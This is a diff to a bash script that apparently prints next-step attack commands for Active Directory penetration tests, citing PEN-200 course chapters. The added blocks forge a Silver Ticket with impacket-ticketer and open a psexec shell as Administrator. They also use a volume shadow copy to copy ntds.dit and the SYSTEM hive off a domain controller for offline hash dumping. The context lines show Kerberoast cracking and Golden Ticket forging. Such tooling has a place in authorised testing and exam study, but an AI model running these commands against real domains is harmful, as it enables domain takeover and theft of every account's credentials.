@@ -350,6 +350,16 @@ generate_ad_2025_next_steps() {
             "hashcat -m 13100 ${OUTDIR}/hashes/kerberoast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --show" \
             "cat ${OUTDIR}/users/kerberoastable.txt" \
             "# In BloodHound: Kerberoastable Users with Path to Domain Admins"
+
+        attack_cmd_once "SILVER TICKET (when a service-account NT hash is cracked but DCSync is blocked)" \
+            "# Covered in PEN-200 ch 23.2.4 — forge a TGS directly for ONE service (no DC needed)." \
+            "# Use AFTER crackr.sh yields a plaintext for a Kerberoastable service account." \
+            "# First: compute the NT hash of the cracked password:" \
+            "python3 -c 'from impacket.ntlm import compute_nthash; import sys; print(compute_nthash(sys.argv[1]).hex())' '<CRACKED_PASS>'" \
+            "# Then forge a Silver Ticket for the service SPN (cifs/host/http/ldap/mssqlsvc):" \
+            "impacket-ticketer -nthash <SERVICE_NT_HASH> -domain-sid <DOMAIN_SID> -domain ${DOMAIN} -spn cifs/<TARGET_HOST>.${DOMAIN} Administrator" \
+            "export KRB5CCNAME=Administrator.ccache" \
+            "impacket-psexec -k -no-pass <TARGET_HOST>.${DOMAIN}"
     fi
 
     if grep -qF "LAPS_READABLE=YES" "$notes" 2>/dev/null; then
@@ -466,6 +476,17 @@ generate_ad_2025_next_steps() {
             "impacket-psexec -hashes '<LM:NT>' ${DOMAIN}/Administrator@${DC_IP}" \
             "impacket-ticketer -nthash <KRBTGT_NT_HASH> -domain-sid <DOMAIN_SID> -domain ${DOMAIN} Administrator" \
             "export KRB5CCNAME=Administrator.ccache && impacket-psexec -k -no-pass ${DOMAIN}/Administrator@${DC_IP}"
+
+        attack_cmd_once "SHADOW COPIES FALLBACK (when DCSync is blocked but you have a shell as local admin on DC)" \
+            "# Use when impacket-secretsdump -just-dc fails (signing/firewall/EDR) but you can run code on the DC as admin." \
+            "# Covered in PEN-200 ch 24.2.2." \
+            "# On DC (cmd as admin):" \
+            "vssadmin create shadow /for=C:" \
+            "copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit C:\\Temp\\ntds.dit" \
+            "reg save HKLM\\SYSTEM C:\\Temp\\SYSTEM" \
+            "# Exfil both to Kali (e.g. servr.sh), then offline dump:" \
+            "impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL"
+
     fi
 
     if grep -qF "PRIV_SESSIONS=YES" "$notes" 2>/dev/null; then
